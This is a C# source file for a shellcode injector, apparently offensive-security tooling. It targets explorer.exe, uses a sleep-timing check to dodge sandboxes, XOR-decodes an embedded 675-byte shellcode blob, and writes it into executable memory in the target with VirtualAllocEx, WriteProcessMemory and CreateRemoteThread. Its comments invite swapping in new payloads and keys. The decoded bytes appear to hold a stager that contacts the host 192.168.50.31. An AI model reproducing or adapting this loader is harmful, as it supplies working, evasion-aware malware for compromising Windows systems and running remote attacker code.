using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Security.Cryptography;

namespace ReflectiveDLLInjection
{
    public class Program
    {
        [DllImport("kernel32.dll")]
        private static extern void Sleep(uint dwMilliseconds);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32.dll")]
        static extern uint SuspendThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        static extern int ResumeThread(IntPtr hThread);

        #region Reflective DLL Injection flags
        //http://www.pinvoke.net/default.aspx/kernel32/OpenProcess.html
        public enum ProcessAccessRights
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        //https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
        public enum MemAllocation
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x1000000,
            SecCommit = 0x08000000
        }

        //https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
        public enum MemProtect
        {
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_TARGETS_INVALID = 0x40000000,
            PAGE_TARGETS_NO_UPDATE = 0x40000000,
        }

        [Flags]
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200)
        }

        #endregion

        //https://stackoverflow.com/questions/3710132/byte-array-cryptography-in-c-sharp


        public static int SearchForTargetID(string process)
        {
            int pid = 0;
            int session = Process.GetCurrentProcess().SessionId;
            Process[] allprocess = Process.GetProcessesByName(process);

            try
            {
                foreach (Process proc in allprocess)
                {
                    Console.WriteLine(proc.SessionId);

                    if (proc.SessionId == session)
                    {
                        pid = proc.Id;
                        Console.WriteLine($"[+] Target process ID found: {pid}.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
                Console.WriteLine(ex.Message);
            }
            return pid;
        }

        static void Suspend(Process process)
        {
            foreach (ProcessThread thread in process.Threads)
            {
                var pOpenThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)thread.Id);
                if (pOpenThread == IntPtr.Zero)
                {
                    break;
                }
                SuspendThread(pOpenThread);
            }
        }
        static void Resume(Process process)
        {
            foreach (ProcessThread thread in process.Threads)
            {
                var pOpenThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)thread.Id);
                if (pOpenThread == IntPtr.Zero)
                {
                    break;
                }
                ResumeThread(pOpenThread);
            }
        }
        private static void sleep()
        {
            Console.WriteLine("zzz...");
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }
        }
        static void Main(string[] args)
        {

            Process[] expProc = Process.GetProcessesByName("explorer");

            for (int i = 0; i < expProc.Length; i++)
            {
                int pid = expProc[i].Id;
                Console.WriteLine(pid);
                Suspend(expProc[i]);
                Console.WriteLine("Suspending...");
                Resume(expProc[i]);
                sleep();
                // Environment.Exit(0);

            }



            // Change XOR key and target Process

            int targetProccessId = expProc[0].Id;
            Console.WriteLine(targetProccessId);
            //

            // Paste the XORED shellcode below
            byte[] buf = new byte[675] {
0x06,0xb2,0x79,0x1e,0x0a,0x12,0x36,0xfa,0xfa,0xfa,0xbb,0xab,0xbb,
0xaa,0xa8,0xab,0xac,0xb2,0xcb,0x28,0x9f,0xb2,0x71,0xa8,0x9a,0xb2,
0x71,0xa8,0xe2,0xb2,0x71,0xa8,0xda,0xb7,0xcb,0x33,0xb2,0xf5,0x4d,
0xb0,0xb0,0xb2,0x71,0x88,0xaa,0xb2,0xcb,0x3a,0x56,0xc6,0x9b,0x86,
0xf8,0xd6,0xda,0xbb,0x3b,0x33,0xf7,0xbb,0xfb,0x3b,0x18,0x17,0xa8,
0xb2,0x71,0xa8,0xda,0x71,0xb8,0xc6,0xb2,0xfb,0x2a,0x9c,0x7b,0x82,
0xe2,0xf1,0xf8,0xbb,0xab,0xf5,0x7f,0x88,0xfa,0xfa,0xfa,0x71,0x7a,
0x72,0xfa,0xfa,0xfa,0xb2,0x7f,0x3a,0x8e,0x9d,0xb2,0xfb,0x2a,0xaa,
0xbe,0x71,0xba,0xda,0x71,0xb2,0xe2,0xb3,0xfb,0x2a,0x19,0xac,0xb2,
0x05,0x33,0xb7,0xcb,0x33,0xbb,0x71,0xce,0x72,0xb2,0xfb,0x2c,0xb2,
0xcb,0x3a,0x56,0xbb,0x3b,0x33,0xf7,0xbb,0xfb,0x3b,0xc2,0x1a,0x8f,
0x0b,0xb6,0xf9,0xb6,0xde,0xf2,0xbf,0xc3,0x2b,0x8f,0x22,0xa2,0xbe,
0x71,0xba,0xde,0xb3,0xfb,0x2a,0x9c,0xbb,0x71,0xf6,0xb2,0xbe,0x71,
0xba,0xe6,0xb3,0xfb,0x2a,0xbb,0x71,0xfe,0x72,0xb2,0xfb,0x2a,0xbb,
0xa2,0xbb,0xa2,0xa4,0xa3,0xa0,0xbb,0xa2,0xbb,0xa3,0xbb,0xa0,0xb2,
0x79,0x16,0xda,0xbb,0xa8,0x05,0x1a,0xa2,0xbb,0xa3,0xa0,0xb2,0x71,
0xe8,0x13,0xb1,0x05,0x05,0x05,0xa7,0xb2,0xcb,0x21,0xa9,0xb3,0x44,
0x8d,0x93,0x94,0x93,0x94,0x9f,0x8e,0xfa,0xbb,0xac,0xb2,0x73,0x1b,
0xb3,0x3d,0x38,0xb6,0x8d,0xdc,0xfd,0x05,0x2f,0xa9,0xa9,0xb2,0x73,
0x1b,0xa9,0xa0,0xb7,0xcb,0x3a,0xb7,0xcb,0x33,0xa9,0xa9,0xb3,0x40,
0xc0,0xac,0x83,0x5d,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,0x12,0xf4,0xfa,
0xfa,0xfa,0xcb,0xc3,0xc8,0xd4,0xcb,0xcc,0xc2,0xd4,0xcf,0xca,0xd4,
0xc9,0xcb,0xfa,0xa0,0xb2,0x73,0x3b,0xb3,0x3d,0x3a,0x41,0xfb,0xfa,
0xfa,0xb7,0xcb,0x33,0xa9,0xa9,0x90,0xf9,0xa9,0xb3,0x40,0xad,0x73,
0x65,0x3c,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,0x12,0x83,0xfa,0xfa,0xfa,
0xd5,0x9e,0xc2,0xbe,0x90,0x9c,0x80,0x8d,0xb9,0xa9,0x88,0xb2,0xaa,
0xa3,0xb7,0xcf,0x93,0x88,0xb1,0xbe,0xcd,0x9e,0x8d,0xcb,0xce,0x8d,
0x80,0x89,0xc2,0xb1,0x89,0x96,0xb5,0xa0,0x8e,0x80,0x88,0x82,0x90,
0x80,0xb8,0xd7,0x8e,0xbf,0xa0,0xb2,0x98,0x95,0xbe,0xb2,0x91,0xcd,
0x8a,0x94,0xb4,0xce,0xb5,0x92,0x8b,0xcd,0xc2,0x9f,0xc8,0xab,0xa9,
0xb9,0x82,0x8a,0xc2,0x88,0xb0,0xb5,0x8c,0xb6,0xaa,0x9c,0xa5,0x94,
0x9d,0xb6,0xc9,0x8c,0xc2,0x89,0xca,0x96,0xb5,0xaa,0x89,0x9e,0x89,
0xaf,0x88,0xbc,0xac,0x92,0xbc,0xcd,0x92,0xb6,0x88,0x92,0x97,0x95,
0xb8,0x98,0xcf,0x94,0x93,0xb9,0x91,0xbb,0xcd,0x9b,0x99,0xb5,0x90,
0xac,0x94,0xcb,0xfa,0xb2,0x73,0x3b,0xa9,0xa0,0xbb,0xa2,0xb7,0xcb,
0x33,0xa9,0xb2,0x42,0xfa,0xc8,0x52,0x7e,0xfa,0xfa,0xfa,0xfa,0xaa,
0xa9,0xa9,0xb3,0x3d,0x38,0x11,0xaf,0xd4,0xc1,0x05,0x2f,0xb2,0x73,
0x3c,0x90,0xf0,0xa5,0xb2,0x73,0x0b,0x90,0xe5,0xa0,0xa8,0x92,0x7a,
0xc9,0xfa,0xfa,0xb3,0x73,0x1a,0x90,0xfe,0xbb,0xa3,0xb3,0x40,0x8f,
0xbc,0x64,0x7c,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,0xb7,0xcb,0x3a,0xa9,
0xa0,0xb2,0x73,0x0b,0xb7,0xcb,0x33,0xb7,0xcb,0x33,0xa9,0xa9,0xb3,
0x3d,0x38,0xd7,0xfc,0xe2,0x81,0x05,0x2f,0x7f,0x3a,0x8f,0xe5,0xb2,
0x3d,0x3b,0x72,0xe9,0xfa,0xfa,0xb3,0x40,0xbe,0x0a,0xcf,0x1a,0xfa,
0xfa,0xfa,0xfa,0x05,0x2f,0xb2,0x05,0x35,0x8e,0xf8,0x11,0x50,0x12,
0xaf,0xfa,0xfa,0xfa,0xa9,0xa3,0x90,0xba,0xa0,0xb3,0x73,0x2b,0x3b,
0x18,0xea,0xb3,0x3d,0x3a,0xfa,0xea,0xfa,0xfa,0xb3,0x40,0xa2,0x5e,
0xa9,0x1f,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,0xb2,0x69,0xa9,0xa9,0xb2,
0x73,0x1d,0xb2,0x73,0x0b,0xb2,0x73,0x20,0xb3,0x3d,0x3a,0xfa,0xda,
0xfa,0xfa,0xb3,0x73,0x03,0xb3,0x40,0xe8,0x6c,0x73,0x18,0xfa,0xfa,
0xfa,0xfa,0x05,0x2f,0xb2,0x79,0x3e,0xda,0x7f,0x3a,0x8e,0x48,0x9c,
0x71,0xfd,0xb2,0xfb,0x39,0x7f,0x3a,0x8f,0x28,0xa2,0x39,0xa2,0x90,
0xfa,0xa3,0x41,0x1a,0xe7,0xd0,0xf0,0xbb,0x73,0x20,0x05,0x2f
};

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
            IntPtr lpThreadId = IntPtr.Zero;


            IntPtr procHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)targetProccessId);
            Console.WriteLine($"[+] Getting the handle for the target process: {procHandle}.");
            IntPtr remoteAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
            Console.WriteLine($"[+] Allocating memory in the remote process {remoteAddr}.");
            Console.WriteLine($"[+] Writing shellcode at the allocated memory location.");
            if (WriteProcessMemory(procHandle, remoteAddr, buf, (uint)buf.Length, out lpNumberOfBytesWritten))
            {
                Console.WriteLine($"[+] Shellcode written in the remote process.");
                // If I know which thread is created, then I can specifically target that thread to stop.
                CreateRemoteThread(procHandle, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out lpThreadId);
            }
            else
            {
                Console.WriteLine($"[+] Failed to inject shellcode.");
            }


        }
    }
}
